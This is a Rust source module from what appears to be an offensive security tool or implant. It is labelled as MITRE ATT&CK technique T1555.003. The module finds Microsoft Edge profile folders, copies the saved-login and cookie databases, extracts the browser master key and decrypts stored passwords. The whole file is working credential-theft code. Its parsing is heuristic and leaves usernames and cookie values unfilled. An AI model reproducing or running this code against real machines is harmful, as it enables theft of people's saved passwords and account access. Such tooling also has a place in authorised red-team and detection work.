//! Microsoft Edge (Chromium-based) credential and cookie extraction
//!
//! Edge uses the same Chromium storage format as Chrome. This module
//! delegates to the Chrome extraction logic with Edge-specific paths.
//!
//! ## MITRE ATT&CK
//! - T1555.003: Credentials from Web Browsers

use super::{BrowserCookie, BrowserCredential};
use common::KrakenError;

#[cfg(windows)]
const EDGE_PATHS: &[&str] = &[
    "Microsoft\\Edge\\User Data",
    "Microsoft\\Edge Dev\\User Data",
    "Microsoft\\Edge Beta\\User Data",
];

/// Extract saved passwords from Microsoft Edge
#[cfg(windows)]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    let user_data_dir = find_edge_dir()?;
    let master_key =
        super::chrome::extract_master_key(&user_data_dir.join("Local State"))?;

    let login_db = user_data_dir.join("Default").join("Login Data");
    let temp_path = std::env::temp_dir()
        .join(format!("kr_edge_login_{}.db", std::process::id()));
    std::fs::copy(&login_db, &temp_path)
        .map_err(|e| KrakenError::Module(format!("copy Edge Login Data: {e}")))?;

    let db_bytes = std::fs::read(&temp_path)
        .map_err(|e| KrakenError::Module(format!("read Edge Login Data: {e}")))?;
    let _ = std::fs::remove_file(&temp_path);

    // Reuse Chrome raw parser, just tag as "edge"
    Ok(parse_login_data_tagged(&db_bytes, &master_key, "edge"))
}

/// Extract cookies from Microsoft Edge
#[cfg(windows)]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    let user_data_dir = find_edge_dir()?;
    let _master_key =
        super::chrome::extract_master_key(&user_data_dir.join("Local State"))?;

    // Edge uses same path as Chrome since ~Edge 88
    let cookies_db = user_data_dir
        .join("Default")
        .join("Network")
        .join("Cookies");
    let temp_path = std::env::temp_dir()
        .join(format!("kr_edge_cookies_{}.db", std::process::id()));
    std::fs::copy(&cookies_db, &temp_path)
        .map_err(|e| KrakenError::Module(format!("copy Edge Cookies: {e}")))?;

    let db_bytes = std::fs::read(&temp_path)
        .map_err(|e| KrakenError::Module(format!("read Edge Cookies: {e}")))?;
    let _ = std::fs::remove_file(&temp_path);

    Ok(parse_cookies_tagged(&db_bytes, "edge"))
}

#[cfg(windows)]
fn find_edge_dir() -> Result<std::path::PathBuf, KrakenError> {
    let local_app_data = std::env::var("LOCALAPPDATA")
        .map_err(|_| KrakenError::Module("LOCALAPPDATA not set".into()))?;

    for path in EDGE_PATHS {
        let full = std::path::PathBuf::from(&local_app_data).join(path);
        if full.exists() {
            return Ok(full);
        }
    }
    Err(KrakenError::Module("Microsoft Edge not found".into()))
}

/// Heuristic raw-SQLite login scan (same logic as Chrome, tagged "edge")
#[cfg(windows)]
fn parse_login_data_tagged(
    db_bytes: &[u8],
    master_key: &[u8],
    browser: &str,
) -> Vec<BrowserCredential> {
    let raw = String::from_utf8_lossy(db_bytes);
    let mut out = Vec::new();

    for idx in raw.match_indices("http") {
        let slice = &raw[idx.0..];
        if let Some(end) = slice.find('\0') {
            let url = slice[..end].trim();
            if url.len() > 8 && url.len() < 512 {
                let password = find_v10_blob(db_bytes, idx.0)
                    .and_then(|blob| {
                        super::decrypt::aes_gcm_decrypt(master_key, blob).ok()
                    })
                    .and_then(|plain| String::from_utf8(plain).ok())
                    .unwrap_or_else(|| "[encrypted]".to_string());

                out.push(BrowserCredential {
                    browser: browser.to_string(),
                    url: url.to_string(),
                    username: String::new(),
                    password,
                    created: 0,
                    last_used: 0,
                });
            }
        }
    }
    out
}

/// Heuristic raw-SQLite cookie scan tagged with browser name
#[cfg(windows)]
fn parse_cookies_tagged(db_bytes: &[u8], browser: &str) -> Vec<BrowserCookie> {
    let raw = String::from_utf8_lossy(db_bytes);
    let mut out = Vec::new();

    for idx in raw.match_indices('.') {
        let start = idx.0.saturating_sub(32);
        let end = std::cmp::min(raw.len(), idx.0 + 128);
        let slice = &raw[start..end];
        if slice.contains(".com\0")
            || slice.contains(".net\0")
            || slice.contains(".org\0")
            || slice.contains(".io\0")
        {
            if let Some(domain_end) = raw[idx.0..].find('\0') {
                let domain = raw[idx.0..idx.0 + domain_end].trim_start_matches('.');
                if !domain.is_empty() && domain.len() < 256 {
                    out.push(BrowserCookie {
                        browser: browser.to_string(),
                        domain: domain.to_string(),
                        name: String::new(),
                        value: "[encrypted]".to_string(),
                        expires: 0,
                        secure: false,
                        http_only: false,
                    });
                }
            }
        }
    }
    out.dedup_by(|a, b| a.domain == b.domain);
    out
}

#[cfg(windows)]
fn find_v10_blob(bytes: &[u8], after: usize) -> Option<&[u8]> {
    let search = &bytes[after..];
    for i in 0..search.len().saturating_sub(3) {
        if &search[i..i + 3] == b"v10" || &search[i..i + 3] == b"v11" {
            return Some(&search[i..]);
        }
    }
    None
}

// ── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    Err(KrakenError::Module(
        "Edge extraction only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    Err(KrakenError::Module(
        "Edge extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_edge_unsupported() {
        assert!(extract_passwords().is_err());
        assert!(extract_cookies().is_err());
    }
}
